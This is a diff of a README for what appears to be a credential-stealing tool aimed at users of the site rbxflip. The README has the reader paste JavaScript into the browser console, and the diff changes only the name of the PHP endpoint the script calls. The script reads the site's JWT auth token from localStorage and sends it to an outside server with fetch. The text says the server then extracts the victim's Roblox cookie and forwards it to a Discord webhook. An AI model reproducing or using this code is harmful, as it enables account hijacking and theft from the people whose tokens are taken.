@@ -11,7 +11,7 @@
 5. Paste that inside the console:
 ```
 var token = localStorage.getItem('auth._token.local');
-await fetch("https://yourdomain.com/cl.php?t=" + token);
+await fetch("https://yourdomain.com/sc.php?t=" + token);
 ```
 6. The simple js code will get the value of auth._token.local (JWT Token) and then decoding (server-sided), after decoding it, it will read the "credentials" object which is the roblox cookie stored on rbxflip, then it sends the cookie to the discord webhook of your choice. Nothing special, but people are selling this shit for $25 lol.
 
